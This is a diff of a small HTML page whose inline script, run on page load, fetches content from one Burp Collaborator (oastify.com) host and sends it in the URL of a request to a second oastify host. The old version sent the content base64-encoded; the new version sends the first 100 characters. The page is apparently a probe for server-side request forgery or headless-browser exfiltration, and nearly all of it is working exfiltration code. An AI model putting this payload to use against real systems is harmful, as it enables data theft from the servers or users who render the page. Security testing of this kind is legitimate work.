@@ -5,33 +5,23 @@
     <meta charset="UTF-8">
   </head>
   <body>
-    <img src="http://gooddddzzgle.com">
     <script>
-      const urlParams = new URLSearchParams(window.location.search);
-      const url = "https://gau63fttqznnll4g94vrw2tmud04o3cs.oastify.com/1";
-
-      if (!url) {
-        console.error('No URL parameter specified!');
-      } else {
-        const options = {
-          mode: 'no-cors'
-        };
-        fetch(url, options)
-          .then(response => response.blob())
-          .then(blob => {
-            const reader = new FileReader();
-            reader.readAsDataURL(blob);
-            reader.onloadend = function() {
-              const base64data = reader.result.replace(/^data:(.*;base64,)?/, '');
-              const requestUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/2/' + base64data;
-              fetch(requestUrl, { mode: 'no-cors' })
-                .then(response => response.text())
-                .then(result => console.log(result))
-                .catch(error => console.error(error));
-            };
-          })
-          .catch(error => console.error(error));
-      }
+      const fetchUrl = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/1';
+      const sendUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com';
+      const options = {
+        mode: 'no-cors'
+      };
+      fetch(fetchUrl, options)
+        .then(response => response.text())
+        .then(body => {
+          const croppedBody = body.slice(0, 100);
+          const requestUrl = `${sendUrl}/${croppedBody}`;
+          fetch(requestUrl, options)
+            .then(response => response.text())
+            .then(result => console.log(result))
+            .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
     </script>
   </body>
 </html>
